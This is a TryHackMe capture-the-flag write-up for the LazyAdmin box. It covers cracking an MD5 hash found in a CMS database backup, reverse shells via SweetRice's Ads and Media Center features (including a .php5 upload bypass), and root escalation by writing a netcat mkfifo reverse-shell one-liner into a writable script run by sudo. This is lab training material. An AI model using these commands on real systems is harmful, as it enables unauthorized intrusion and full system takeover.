TryHackMe-LazyAdmin Writeup
ZeusCybersec



In this box, we exploit Sweet Rice CMS to gain a initial shell and privilege escalate to gain root.It is a pretty straight forward box.
ENUMERATION

Port 80 and 22 are open.Port 80 seems to run apache and the os is identified as Ubuntu.

Using Dirsearch we find a hidden directory called /content

Seems like a CMS called sweetrice is running.I tried looking for it’s version but was out of luck.

Since we found a directory called /content, lets scan for further sub-directories within /content and we find many more

Within /inc directory we find a mysql backup file.Backup files often contain passwords!

If we carefully look within it, we find words like admin,passwd and also a string “42f749ad….” which seems like a password string.If we copy and google it, we immediately find that it is an MD5 hash.

It can also be cracked using crackstation or hashcat.We find the password as Password123. In the /as directory, we find the admin panel of sweet rice and use the credentials manager:Password123 to log in and we are in!

Once we are in, we can Finally see the version of SweetRice CMS which is running.Exploits for the version can be found both via google and searchsploit.
EXPLOITATION

From Here onwards, i went on a rabbit hole and tried using this exploit which showed Arbitary File Upload-https://www.exploit-db.com/exploits/40700

However it failed despite multiple tries.If you read the python code carefully, you will find that the script does not do anything special but upload file in “media-centre” of SweetRice CMS after login in using the credentials you supply.This can also be done manually by us(which i will cover later in this writeup)Also this shows us that it is useful to at least understand what a python code is doing which is why you should definitely learn python :D

I will show both methods to get a shell !
METHOD #1

Then i came across some other exploits for the same version and found one having PHP Code Execution.
Result from searchsploit

The same can also be found on exploit db-https://www.exploit-db.com/exploits/40700

If you read the exploit carefully, it informs us that if we go to the Ads section of SweetRice Cms and insert a malicious php code, we can run it.So what we can do is insert a php reverse shell and run it as well! The php reverse shell i have used here has been taken from pentestmonkey.

Once our reverse shell has been uploaded, we need to start a netcat listener and then run the reverse shell file which in our case is “reverse_shell.php” However i had a tough time finding the location of this file(where it was uploaded) and i finally found out that is is uploaded in /content/inc/ads

Also if you read the exploit carefully and see the last line, it mentions

“You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php”

So lets access it and run our php file

We click on reverse shell file and run it and we have a shell!!!
METHOD #2

If you understand python and carefully read the Arbitary file upload exploit-https://www.exploit-db.com/exploits/40700

you will see that the script tries to go to media_centre and upload a file

Infact there indeed is a section called Media Centre in Sweetrice CMS where file can be uploaded.

Another point to Note is that if you look at the type of file we can upload here, you will find shell.php5 (Here the extension is php5 not php).

This is a type of file upload bypass.Other examples of uploading .php files when it is actually restricted to upload a .php file are using shell.php3, shell.php6, shell.phtml (REFER-https://book.hacktricks.xyz/pentesting-web/file-upload)

SO lets go to Media Center in SweetRice and upload a reverse shell file called revershell.php5

Once uploaded, all you have to do is start a netcat listener and click on revershell.php5 which can be seen on screen(i have highlighted it in blue) and the php file will execute.(I did have trouble locating this file but then found that it was clearly visible on the screen and all i had to do was click on it)

Hence i have covered both ways to get a shell. One using Ads and another through Media Center
PRIVILEGE ESCALATION

Once we have a shell, lets run upgrade our shell by running-

python -c ‘import pty;pty.spawn(“/bin/bash”)’

Then we run sudo -l to see all commands we can run as root.We find that we can run backup.pl as sudo without any password.Sadly we dont have the permissions to edit and write to backup.pl. Now if we cat backup.pl to see the contents inside the file, we find that it is simply running a file called copy.sh which is located in /etc directory.

Now if you run the command-

cat /etc/copy.sh you will be able to read what is inside copy.sh and we find that it is a netcat reverse shell.MOREOVER, we have write permission on copy.sh so we can edit and change the script inside it.

HERE IS OUR GAME PLAN! We will put a netcat reverse shell in copy.sh and then run backup.pl as sudo (which in turn will execute copy.sh as root) and give us a reverse shell.

ALL you need to do is run the command below.

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.39.155 1234 >/tmp/f" > /etc/copy.sh

Here we are simply copying a one liner reverse shell to copy.sh (NOTE: i tried using a one liner bash reverse shell however it threw an error.But this netcat reverse shell works) SOURCE-https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Once done, we finally run backup.pl as sudo
sudo /usr/bin/perl /home/itguy/backup.pl

AND FINALLY GET A REVERSE SHELL AS ROOT !!!



